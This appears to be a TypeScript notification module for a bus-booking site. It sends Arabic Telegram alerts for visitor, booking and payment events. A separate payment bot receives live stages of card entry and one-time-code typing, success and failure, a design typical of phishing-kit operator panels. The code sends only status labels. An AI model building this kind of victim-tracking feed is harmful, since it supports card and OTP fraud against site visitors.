import { z } from 'zod';
import { db } from './db.js';

const bookingEventSchema = z.object({
  event: z.enum([
    'visitor-enter',
    'search-submitted',
    'trip-selected',
    'seats-selected',
    'passenger-info',
    'payment-method',
    'new-booking',
  ]),
  from: z.string().max(120).optional(),
  to: z.string().max(120).optional(),
  date: z.string().max(40).optional(),
  passengers: z.string().max(20).optional(),
  tripNumber: z.string().max(80).optional(),
  fareClass: z.string().max(80).optional(),
  seats: z.string().max(200).optional(),
  paymentMethod: z.string().max(80).optional(),
  amount: z.string().max(40).optional(),
  page: z.string().max(200).optional(),
}).strict();

const paymentEventSchema = z.object({
  status: z.enum([
    'fill_in_started',
    'filled_in',
    'verification_input_complete',
    'verification_submitted',
    'verification_succeeded',
    'verification_failed',
  ]),
}).strict();

export type BookingEvent = z.infer<typeof bookingEventSchema>;
export type PaymentEvent = z.infer<typeof paymentEventSchema>;

function escapeHtml(value: unknown): string {
  return String(value ?? '')
    .replaceAll('&', '&amp;')
    .replaceAll('<', '&lt;')
    .replaceAll('>', '&gt;');
}

function getStoredSetting(key: string, fallback = ''): string {
  return db.setting.findUnique({ where: { key } })?.value || fallback;
}

type StoredMessage = { id?: string; enabled?: boolean; template?: string };

function getNotificationState() {
  const raw = getStoredSetting('telegramFullSettings');
  if (!raw) return { bookingEnabled: true, paymentEnabled: true, bookingMessages: [], paymentMessages: [] };
  try {
    const parsed = JSON.parse(raw) as {
      bookingEnabled?: boolean;
      paymentEnabled?: boolean;
      bookingMessages?: StoredMessage[];
      paymentMessages?: StoredMessage[];
    };
    return {
      bookingEnabled: parsed.bookingEnabled ?? true,
      paymentEnabled: parsed.paymentEnabled ?? true,
      bookingMessages: Array.isArray(parsed.bookingMessages) ? parsed.bookingMessages : [],
      paymentMessages: Array.isArray(parsed.paymentMessages) ? parsed.paymentMessages : [],
    };
  } catch {
    return { bookingEnabled: true, paymentEnabled: true, bookingMessages: [], paymentMessages: [] };
  }
}

async function sendTelegramMessage(token: string, chatId: string, text: string): Promise<boolean> {
  if (!token || !chatId) return false;
  const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' }),
    signal: AbortSignal.timeout(8000),
  });
  return response.ok;
}

function bookingMessage(input: BookingEvent): string {
  const titles: Record<BookingEvent['event'], string> = {
    'visitor-enter': '🌐 دخول زائر جديد',
    'search-submitted': '🔍 تنفيذ بحث عن رحلة',
    'trip-selected': '🚌 اختيار رحلة',
    'seats-selected': '💺 اختيار المقاعد',
    'passenger-info': '👥 اكتمال بيانات المسافرين',
    'payment-method': '💳 اختيار طريقة الدفع',
    'new-booking': '✅ حجز جديد',
  };
  const lines = [`<b>${titles[input.event]}</b>`];
  if (input.from || input.to) lines.push(`المسار: ${escapeHtml(input.from)} ← ${escapeHtml(input.to)}`);
  if (input.date) lines.push(`التاريخ: ${escapeHtml(input.date)}`);
  if (input.passengers) lines.push(`عدد المسافرين: ${escapeHtml(input.passengers)}`);
  if (input.tripNumber) lines.push(`الرحلة: ${escapeHtml(input.tripNumber)}`);
  if (input.fareClass) lines.push(`الفئة: ${escapeHtml(input.fareClass)}`);
  if (input.seats) lines.push(`المقاعد: ${escapeHtml(input.seats)}`);
  if (input.paymentMethod) lines.push(`طريقة الدفع: ${escapeHtml(input.paymentMethod)}`);
  if (input.amount) lines.push(`المبلغ: ${escapeHtml(input.amount)}`);
  if (input.page) lines.push(`الصفحة: ${escapeHtml(input.page)}`);
  return lines.join('\n');
}

function paymentMessage(input: PaymentEvent): string {
  const titles: Record<PaymentEvent['status'], string> = {
    'fill_in_started': '🟡 حالة العملية: fill in',
    'filled_in': '✅ حالة العملية: filled in',
    'verification_input_complete': '🟡 حالة العملية: verification filled in',
    'verification_submitted': '🔄 حالة العملية: verification submitted',
    'verification_succeeded': '✅ حالة العملية: verification succeeded',
    'verification_failed': '❌ حالة العملية: verification failed',
  };
  return `<b>${titles[input.status]}</b>`;
}

function renderSafeTemplate(template: string, values: Record<string, string>): string {
  return template.replace(/\{([^}]+)\}/g, (_match, key: string) => values[key] ?? '[محجوب]');
}

function bookingTemplateValues(input: BookingEvent): Record<string, string> {
  return {
    from: escapeHtml(input.from),
    fromLocation: escapeHtml(input.from),
    to: escapeHtml(input.to),
    toLocation: escapeHtml(input.to),
    date: escapeHtml(input.date),
    pickupDate: escapeHtml(input.date),
    passengers: escapeHtml(input.passengers),
    tripNumber: escapeHtml(input.tripNumber),
    fareClass: escapeHtml(input.fareClass),
    seats: escapeHtml(input.seats),
    selectedSeats: escapeHtml(input.seats),
    paymentMethod: escapeHtml(input.paymentMethod),
    amount: escapeHtml(input.amount),
    totalAmount: escapeHtml(input.amount),
    page: escapeHtml(input.page),
    time: escapeHtml(new Date().toLocaleString('ar-SA')),
  };
}

export async function sendBookingNotification(payload: unknown): Promise<boolean> {
  const input = bookingEventSchema.parse(payload);
  const state = getNotificationState();
  if (!state.bookingEnabled) return false;
  const messageSetting = state.bookingMessages.find(message => message.id === input.event);
  if (messageSetting?.enabled === false) return false;
  const token = getStoredSetting('telegramBotToken', process.env.TELEGRAM_BOT_TOKEN || '');
  const chatId = getStoredSetting('telegramChatId', process.env.TELEGRAM_CHAT_ID || '');
  const text = messageSetting?.template
    ? renderSafeTemplate(messageSetting.template, bookingTemplateValues(input))
    : bookingMessage(input);
  return sendTelegramMessage(token, chatId, text);
}

export async function sendPaymentNotification(payload: unknown): Promise<boolean> {
  const input = paymentEventSchema.parse(payload);
  const state = getNotificationState();
  if (!state.paymentEnabled) return false;
  const messageIdByStatus: Record<PaymentEvent['status'], string> = {
    fill_in_started: 'card-entered',
    filled_in: 'card-complete',
    verification_input_complete: 'otp-typing',
    verification_submitted: 'otp-attempt',
    verification_succeeded: 'otp-success',
    verification_failed: 'otp-failed',
  };
  const messageSetting = state.paymentMessages.find(message => message.id === messageIdByStatus[input.status]);
  if (messageSetting?.enabled === false) return false;
  const token = getStoredSetting('paymentBotToken', process.env.PAYMENT_BOT_TOKEN || '');
  const chatId = getStoredSetting('paymentChatId', process.env.PAYMENT_CHAT_ID || '');
  return sendTelegramMessage(token, chatId, paymentMessage(input));
}
